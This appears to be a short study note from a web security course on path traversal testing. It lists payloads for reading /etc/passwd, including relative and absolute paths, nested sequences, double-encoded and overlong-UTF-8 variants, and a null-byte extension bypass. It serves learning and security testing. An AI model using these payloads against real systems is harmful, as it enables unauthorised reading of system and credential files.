### Where to look

- Review parameters in the URL and POST body where files or directories are referenced

### What to try

- Reading arbitrary files at `/var/www/images/../../../etc/passwd` by submitting `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
- Try absolute paths `filename=/etc/passwd`
- Nested traversal sequences `....//` or `....\/`
- Encoding and double encoding in `multipart/form-data` requests like `%2e%2e%2f` and `%252e%252e%252f`
- Non-standard encodings like `..%c0%af` or `..%ef%bc%8f` may work as well
- Parameter may expect value to start with proper full file path `filename=/var/www/images/../../../etc/passwd`
- Parameter may expect value to end with certain extension `filename=../../../etc/passwd%00.png`

### More Details

More details can be found at [[Cyber Security/Learning/Web Security Academy/Path Traversal|Path Traversal]]